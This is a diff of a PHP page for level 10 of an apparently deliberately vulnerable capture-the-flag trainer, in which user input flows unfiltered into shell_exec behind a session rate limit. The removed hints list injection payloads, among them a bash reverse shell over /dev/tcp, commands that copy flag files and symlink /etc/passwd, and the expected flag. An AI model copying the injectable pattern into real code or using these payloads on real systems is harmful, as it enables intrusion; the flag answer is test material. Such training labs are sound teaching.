@@ -1,194 +1,122 @@
+<?php
+require_once __DIR__ . '/helpers.php';
+
+session_start();
+
+$output_html = '';
+
+if (isset($_GET['process'])) {
+    require_once 'flag_system.php';
+    get_level_flag(10);
+
+    $process      = $_GET['process'];
+    $current_time = time();
+
+    // Rate limiting — 1 request per 2 seconds per session
+    if (isset($_SESSION['last_request']) &&
+        ($current_time - $_SESSION['last_request']) < 2) {
+
+        $wait_time   = 2 - ($current_time - $_SESSION['last_request']);
+        $output_html = '<div class="error">Rate limit exceeded. Please wait ' . $wait_time . ' second(s).</div>'
+                     . '<div class="error">Request blocked by rate limiter</div>';
+    } else {
+        $_SESSION['last_request'] = $current_time;
+
+        // No command filtering at all
+        $command = "timeout 1s ps aux | grep " . $process;
+        $raw     = shell_exec($command . " 2>&1");
+
+        ob_start();
+        if ($raw) {
+            echo '<pre>' . htmlspecialchars($raw) . '</pre>';
+        } else {
+            echo '<div class="message success">No matching processes found</div>';
+        }
+        $output_html = ob_get_clean();
+    }
+}
+
+$hints = get_level_hints(10);
+$_flag_result = handle_inline_flag_submit(10);
+?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level 10 - Race Condition & Automation</title>
+    <title>Level 10 - Race Condition &amp; Automation</title>
     <link rel="stylesheet" href="css/styles.css">
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🏁 Level 10 - Race Condition & Automation</h1>
-            <p><strong>Objective:</strong> Khai thác race conditions và automated injection attacks</p>
+            <h1>Level 10 - Race Condition &amp; Automation</h1>
+            <p><strong>Objective:</strong> Bypass session-based rate limiting and exploit an unfiltered command injection</p>
+            <a href="index.php" class="back-btn">&larr; Back to Levels</a>
         </div>
 
-        <div class="form-container">
-            <h3>🔍 Batch Process Manager:</h3>
-            <p>Hệ thống xử lý batch jobs với rate limiting. Chỉ cho phép 1 request mỗi 2 giây.</p>
-            
-            <div class="code-block">Command: timeout 1s ps aux | grep <?php echo htmlspecialchars($_GET['process'] ?? '[PROCESS]'); ?></div>
-            
-            <?php
-            session_start();
-            
-            if (isset($_GET['process'])) {
-                // Initialize level-specific flag access
-                require_once 'flag_system.php';
-                get_level_flag(10);
-                
-                echo '<h3>📊 Result:</h3>';
-                echo '<div class="result">';
-                
-                $process = $_GET['process'];
-                $current_time = time();
-                
-                // Rate limiting - only allow 1 request per 2 seconds
-                if (isset($_SESSION['last_request']) && 
-                    ($current_time - $_SESSION['last_request']) < 2) {
-                    
-                    $wait_time = 2 - ($current_time - $_SESSION['last_request']);
-                    echo '<div class="error">⏰ Rate limit exceeded. Please wait ' . $wait_time . ' seconds.</div>';
-                    echo '<div class="error">🚫 Request blocked by rate limiter</div>';
-                } else {
-                    // Update last request time
-                    $_SESSION['last_request'] = $current_time;
-                    
-                    // Execute command with timeout
-                    $command = "timeout 1s ps aux | grep " . $process;
-                    $output = shell_exec($command . " 2>&1");
-                    
-                    if ($output) {
-                        echo '<pre>' . htmlspecialchars($output) . '</pre>';
-                    } else {
-                        echo '<div class="success">✅ No matching processes found</div>';
-                    }
-                }
-                
-                echo '</div>';
-            }
-            ?>
-            
-            <h3>🔧 Try Your Input:</h3>
-            <form method="get" style="margin: 20px 0;">
-                <div class="form-group">
-                    <label for="process">Process Name:</label>
-                    <input type="text" id="process" name="process" value="<?php echo htmlspecialchars($_GET['process'] ?? ''); ?>" placeholder="Enter process name (e.g., apache)" oninput="updateCommand()">
-                </div>
-                <button type="submit" class="btn">🚀 Search Process</button>
-            </form>
+        <div class="challenge-layout">
+            <!-- Left: Source Code Panel -->
+            <div class="code-panel">
+                <h3>Vulnerable Source Code</h3>
+                <div class="source-code">
+                    <pre><code>session_start();
 
-            <div class="info-card" style="margin: 20px 0;">
-                <h3>⏰ Rate Limiting Scenario</h3>
-                <ul>
-                    <li><strong>Rate limit:</strong> 1 request per 2 seconds per session</li>
-                    <li><strong>Timeout:</strong> Commands automatically killed after 1 second</li>
-                    <li><strong>Challenge:</strong> Bypass rate limiting and execute longer commands</li>
-                    <li><strong>Real-world:</strong> Many APIs and services use rate limiting</li>
-                </ul>
+<span class="php-variable">$process</span>      = <span class="php-variable">$_GET</span>[<span class="php-string">'process'</span>];
+<span class="php-variable">$current_time</span> = time();
+
+<span class="php-comment">// Rate limit: 1 request per 2 seconds via session</span>
+<span class="php-keyword">if</span> (<span class="php-keyword">isset</span>(<span class="php-variable">$_SESSION</span>[<span class="php-string">'last_request'</span>]) &amp;&amp;
+    (<span class="php-variable">$current_time</span> - <span class="php-variable">$_SESSION</span>[<span class="php-string">'last_request'</span>]) &lt; 2) {
+    <span class="php-keyword">echo</span> <span class="php-string">'Rate limit exceeded'</span>; <span class="php-keyword">exit</span>;
+}
+
+<span class="php-variable">$_SESSION</span>[<span class="php-string">'last_request'</span>] = <span class="php-variable">$current_time</span>;
+
+<span class="php-comment">// No filtering whatsoever</span>
+<span class="vuln-line"><span class="php-variable">$command</span> = <span class="php-string">"timeout 1s ps aux | grep "</span> . <span class="php-variable">$process</span>;</span>
+<span class="php-variable">$output</span>  = shell_exec(<span class="php-variable">$command</span> . <span class="php-string">" 2&gt;&amp;1"</span>);</code></pre>
+                </div>
+                <div class="vuln-annotation">
+                    <strong>Vulnerability:</strong>&nbsp; <code>$process</code> is concatenated directly into the command with absolutely no filtering. The only defence is a session-based rate limiter (1 req/2 s). Bypass the rate limit by sending a fresh session cookie or clearing <code>$_SESSION['last_request']</code>, then read the flag from <code>/tmp/level10_flag.txt</code>.
+                </div>
             </div>
 
-            <div class="info-card" style="margin: 20px 0;">
-                <h3>🏁 Race Condition Techniques</h3>
-                <ul>
-                    <li><strong>Session manipulation:</strong> Reset or modify session state</li>
-                    <li><strong>Parallel requests:</strong> Send multiple requests simultaneously</li>
-                    <li><strong>Background processes:</strong> Start long-running tasks</li>
-                    <li><strong>File locking races:</strong> Exploit file system race conditions</li>
-                    <li><strong>TOCTOU attacks:</strong> Time-of-check to time-of-use</li>
-                </ul>
-            </div>
+            <!-- Right: Challenge Panel -->
+            <div class="challenge-panel">
+                <h3>Challenge</h3>
+                <div class="panel-body">
+                    <div class="scenario">
+                        <p><strong>Tool:</strong> Batch Process Manager — runs <code>timeout 1s ps aux | grep &lt;input&gt;</code>. No command filtering at all. Output is shown directly, so this is not blind injection.</p>
+                        <p>The only obstacle is the 2-second session rate limit. Clear your session cookie, use a fresh incognito tab, or send concurrent requests to bypass it, then inject directly to read the flag.</p>
+                    </div>
 
-            <div class="hint-container">
-                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
-                <div id="hint-1" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 1: Understanding Rate Limiting</h4>
-                    <p><strong>Current Command:</strong> <code>timeout 1s ps aux | grep [PROCESS]</code></p>
-                    <p>📝 <strong>Test normal:</strong> <code>apache</code> (works first time)</p>
-                    <p>📝 <strong>Test rate limit:</strong> Submit again immediately (blocked)</p>
-                    <p>🎯 <strong>Goal:</strong> Bypass the 2-second cooldown and 1-second timeout</p>
-                </div>
-                <div id="hint-2" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 2: Session Bypassing</h4>
-                    <p><strong>Concept:</strong> Rate limiting is based on PHP sessions</p>
-                    <p>📝 <strong>Method 1:</strong> Clear session data in your payload</p>
-                    <p><code>apache; unset $_SESSION; session_destroy()</code> (won't work - server-side)</p>
-                    <p>📝 <strong>Method 2:</strong> Use browser incognito/new session</p>
-                    <p>📝 <strong>Method 3:</strong> Delete browser cookies manually</p>
-                    <p>🎯 <strong>Alternative:</strong> Reset session using command injection itself</p>
-                </div>
-                <div id="hint-3" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 3: Background Process Injection</h4>
-                    <p><strong>Concept:</strong> Start background processes that survive timeout</p>
-                    <p>📝 <strong>Method:</strong> <code>apache; (sleep 10; whoami > /var/www/html/whoami.txt) &</code></p>
-                    <p>🎯 <strong>Explanation:</strong> & runs process in background, survives 1s timeout</p>
-                    <p><strong>Verification:</strong> Wait 10+ seconds, then check <code>http://localhost:8080/whoami.txt</code></p>
-                    <p><strong>Advanced:</strong> <code>apache; nohup cp /var/flags/level10_race.txt /var/www/html/ &</code></p>
-                </div>
-                <div id="hint-4" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 4: Parallel Request Attack</h4>
-                    <p><strong>Concept:</strong> Send multiple requests simultaneously to exploit race conditions</p>
-                    <p>📝 <strong>Manual method:</strong> Open multiple browser tabs/windows</p>
-                    <p>📝 <strong>Submit simultaneously:</strong> Click submit in all tabs at same time</p>
-                    <p>🎯 <strong>Goal:</strong> Some requests might bypass rate limiting due to timing</p>
-                    <p><strong>Tool suggestion:</strong> Use Burp Suite Intruder or curl in parallel</p>
-                    <p><code>curl "http://localhost:8080/level10.php?process=apache" &</code></p>
-                </div>
-                <div id="hint-5" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 5: File-based Race Condition</h4>
-                    <p><strong>Concept:</strong> Exploit temporary file operations</p>
-                    <p>📝 <strong>Create temp file:</strong> <code>apache; echo "command" > /tmp/cmd.sh</code></p>
-                    <p>📝 <strong>Make executable:</strong> <code>apache; chmod +x /tmp/cmd.sh</code></p>
-                    <p>📝 <strong>Execute later:</strong> <code>apache; bash /tmp/cmd.sh &</code></p>
-                    <p>🎯 <strong>Race window:</strong> File might execute between creation and cleanup</p>
-                </div>
-                <div id="hint-6" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 6: TOCTOU (Time-of-Check-Time-of-Use)</h4>
-                    <p><strong>Concept:</strong> Exploit gap between security check and execution</p>
-                    <p>📝 <strong>Method:</strong> <code>apache; ln -sf /var/flags/level10_race.txt /tmp/safe.txt</code></p>
-                    <p>🎯 <strong>Explanation:</strong> Create symlink after validation but before use</p>
-                    <p><strong>Advanced:</strong> <code>apache; (sleep 0.5; ln -sf /etc/passwd /tmp/safe.txt) & cat /tmp/safe.txt</code></p>
-                    <p><strong>Timing attack:</strong> Race between link creation and file access</p>
-                </div>
-                <div id="hint-7" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 7: Persistent Background Shell</h4>
-                    <p><strong>Concept:</strong> Establish persistent access that survives rate limits</p>
-                    <p>📝 <strong>Method:</strong> <code>apache; bash -i >& /dev/tcp/0.0.0.0/4444 0>&1 &</code></p>
-                    <p>🎯 <strong>Note:</strong> This tries to create a reverse shell (may not work in container)</p>
-                    <p><strong>Alternative:</strong> <code>apache; while true; do date >> /var/www/html/heartbeat.txt; sleep 5; done &</code></p>
-                    <p><strong>Check progress:</strong> Monitor <code>http://localhost:8080/heartbeat.txt</code></p>
-                </div>
-                <div id="hint-8" class="hint-box" style="display: none;">
-                    <h4>🎯 Hint 8: Extract the Flag with Race Condition!</h4>
-                    <p><strong>🚀 Target file:</strong> <code>/tmp/level10_flag.txt</code></p>
-                    <p><strong>Method 1 (Background copy):</strong></p>
-                    <p><code>apache; (sleep 3; cp /tmp/level10_flag.txt /var/www/html/) &</code></p>
-                    <p><strong>Method 2 (Parallel requests):</strong></p>
-                    <p>Submit multiple times with: <code>apache; cat /tmp/level10_flag.txt > /var/www/html/flag.txt &</code></p>
-                    <p><strong>Method 3 (TOCTOU):</strong></p>
-                    <p><code>apache; (ln -sf /tmp/level10_flag.txt /var/www/html/race_flag.txt) &</code></p>
-                    <p><strong>🎯 Expected Flag:</strong> <code>FLAG{race_condition_automation_bypass}</code></p>
+                    <?php if ($output_html !== ''): ?>
+                        <div class="result"><?= $output_html ?></div>
+                    <?php endif; ?>
+
+                    <form method="get">
+                        <div class="form-group">
+                            <label for="process">Process Name:</label>
+                            <input type="text" id="process" name="process"
+                                   value="<?= htmlspecialchars($_GET['process'] ?? '') ?>"
+                                   placeholder="e.g., apache">
+                        </div>
+                        <button type="submit" class="btn">Search Process</button>
+                    </form>
                 </div>
             </div>
         </div>
-        
+
+        <?= render_hint_section($hints) ?>
+
+        <?= render_inline_flag_form(10, $_flag_result) ?>
+
         <div class="navigation">
-            <a href="level9.php">⬅️ Previous Level</a>
-            <a href="index.php">🏠 Home</a>
-            <a href="submit.php?level=10">🏆 Submit Flag</a>
+            <a href="level9.php">Previous Level</a>
+            <a href="index.php">Home</a>
+            <a href="submit.php?level=10">Submit Flag</a>
         </div>
     </div>
-
-    <script>
-    let currentHint = 0;
-    const maxHints = 8;
-
-    function showNextHint() {
-        if (currentHint < maxHints) {
-            currentHint++;
-            document.getElementById('hint-' + currentHint).style.display = 'block';
-            
-            if (currentHint === maxHints) {
-                document.querySelector('.hint-btn').style.display = 'none';
-            }
-        }
-    }
-
-    function updateCommand() {
-        const process = document.getElementById('process').value;
-        const codeBlock = document.querySelector('.code-block');
-        codeBlock.innerHTML = `Command: timeout 1s ps aux | grep <span style="color: #ed8936; font-weight: bold;">${process || '[PROCESS]'}</span>`;
-    }
-    </script>
 </body>
 </html>
